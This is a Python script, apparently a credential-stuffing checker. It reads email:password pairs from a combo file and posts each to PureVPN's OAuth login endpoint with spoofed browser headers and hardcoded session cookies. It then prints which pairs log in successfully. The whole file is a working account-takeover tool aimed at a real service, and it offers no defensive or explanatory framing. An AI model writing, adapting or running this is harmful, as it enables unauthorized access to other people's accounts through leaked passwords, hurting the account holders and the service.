import requests

cookies = {
    'fusionauth.timezone': 'Asia/Calcutta',
    'fusionauth.sso': 'AtZzqXza-QC3NlMl30tz6RvA43eMFJ0b6H_ewRD_qzO4',
    'fusionauth.remember-device': 'QkJCAdWxuNeYQX9j9U1HHgiCoacddVf6p3VgDRN-XjWljGAO',
}

headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://auth.purevpn.com',
    'priority': 'u=0, i',
    'referer': 'https://auth.purevpn.com/',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

data = {
    'captcha_token': '',
    'client_id': '28db0173-36af-4812-8b8d-73877583188c',
    'code_challenge': '',
    'code_challenge_method': '',
    'metaData.device.name': 'Windows Chrome',
    'metaData.device.type': 'BROWSER',
    'nonce': '',
    'pendingIdPLinkId': '',
    'redirect_uri': 'https://purevpn.com/rd',
    'response_mode': '',
    'response_type': 'code',
    'scope': '',
    'state': '',
    'tenantId': '9707f41e-21a4-bbc5-dcbc-fdf6b61cc68f',
    'timezone': 'Asia/Calcutta',
    'user_code': '',
    'showPasswordField': 'true',
}

# Read email:password combinations from combo.txt
try:
    with open('combo.txt', 'r') as f:
        combos = f.readlines()
except FileNotFoundError:
    print("Error: combo.txt file not found!")
    exit(1)

# Test each combination
for combo in combos:
    combo = combo.strip()
    if not combo or ':' not in combo:
        continue
    
    # Split email:password
    email, password = combo.split(':', 1)
    
    print(f"\n{'='*60}")
    print(f"Testing: {email}")
    print(f"{'='*60}")
    
    # Update credentials in data
    data['loginId'] = email
    data['password'] = password
    
    # Make the request
    response = requests.post('https://auth.purevpn.com/oauth2/authorize', cookies=cookies, headers=headers, data=data)
    
    # Get the response HTML
    html_content = response.text
    
    # Split into lines
    lines = html_content.split('\n')
    
    # Find the line with "fa fa-exclamation-circle" and print only the 2nd line after it
    error_found = False
    for i, line in enumerate(lines):
        if 'fa fa-exclamation-circle' in line:
            error_found = True
            if i + 2 < len(lines):
                error_msg = lines[i+2].strip()
                print(f"❌ FAILED: {error_msg}")
            break
    
    if not error_found:
        print(f"✅ SUCCESS: Login appears successful!")
        print(f"Valid credentials: {email}:{password}")
